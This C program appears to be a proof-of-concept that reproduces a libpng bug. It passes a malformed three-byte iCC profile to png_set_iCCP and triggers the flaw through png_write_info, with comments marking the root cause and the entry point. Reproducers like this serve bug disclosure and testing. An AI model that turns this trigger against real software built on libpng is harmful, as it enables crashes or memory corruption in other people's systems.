#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "png.h"

int main() {
    FILE *fp = fopen("output.png", "wb");
    if (!fp) {
        perror("fopen");
        return 1;
    }

    png_structp png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING,
                                                  NULL, NULL, NULL);
    if (!png_ptr) return 1;

    png_infop info_ptr = png_create_info_struct(png_ptr);
    if (!info_ptr) {
        png_destroy_write_struct(&png_ptr, NULL);
        return 1;
    }

    if (setjmp(png_jmpbuf(png_ptr))) {
        fprintf(stderr, "libpng triggered an error (likely due to bad profile)\n");
        png_destroy_write_struct(&png_ptr, &info_ptr);
        fclose(fp);
        return 1;
    }

    png_init_io(png_ptr, fp);
    png_set_IHDR(png_ptr, info_ptr,
                 1, 1, 8, PNG_COLOR_TYPE_RGB,
                 PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_BASE, PNG_FILTER_TYPE_BASE);

    /**
     * Malformed iCC profile (3 bytes instead of >= 4)
     */
    const char profile_name[] = "sRGB";
    const char profile_data[] = "ABC";
    png_const_bytep profile_ptr = profile_data;
    png_uint_32 profile_len = 3;
    int compression_type = 0;

    /**
     * The root cause of the vulnerability starts here,
     * when we set the malicious profile (iCC profile less than 4 bytes)
     */
    png_set_iCCP(png_ptr, info_ptr,
                 profile_name, compression_type,
                 profile_data, profile_len);

    /**
     * The entry point to trigger the vulnerability is here,
     * when we write the informations of the png file.
     */
    png_write_info(png_ptr, info_ptr);
    /**
     * which calls:
     * png_write_info_before_PLTE(png_ptr, info_ptr);
     * that then calls:
     * png_write_iCCP(png_ptr, info_ptr->iccp_name, info_ptr->iccp_profile);
     */
    

    /**
     * The rest is what one would typically do to write a png image.
     */
    png_bytep row = (png_bytep)malloc(3);
    memset(row, 255, 3);
    png_write_row(png_ptr, row);
    png_write_end(png_ptr, NULL);

    free(row);
    png_destroy_write_struct(&png_ptr, &info_ptr);
    fclose(fp);
    return 0;
}
